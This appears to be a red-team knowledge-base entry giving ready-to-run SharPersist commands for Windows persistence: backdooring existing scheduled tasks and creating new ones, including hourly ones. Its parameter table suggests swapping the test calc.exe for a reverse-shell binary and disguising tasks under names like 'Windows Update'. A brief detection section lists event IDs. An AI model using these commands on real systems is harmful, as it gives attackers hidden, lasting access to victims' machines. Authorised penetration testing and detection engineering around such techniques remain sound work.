---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
  - backdoor
validated: true
---

# SharPersist-Add-Scheduled-Task

## Code

```powershell
# Add to a current scheduled task
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

# Add new task
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
```

## Description

This snippet uses SharPersist to add backdoors to existing tasks or create new ones, including hourly variants, for flexible persistence options.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "/c calc.exe" | Payload args (replace calc with backdoor) | "/c C:\Temp\revshell.exe" |
| "Something Cool" | Existing task name | "Windows Update" |
| "Some Task" | New task name | "Daily Maintenance" |
| -o hourly | Optional frequency | -o daily |

## Usage

Execute after loading SharPersist.exe. Use for quick task manipulation in engagements; test with benign payloads first.

## Detection

- Execution of unknown binaries like SharPersist.exe.
- Rapid task creations/modifications (Event IDs 4698/4703).
- Tasks with cmd.exe actions spawning calc.exe or similar.

## Related

- [[tools/SharPersist]]
- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
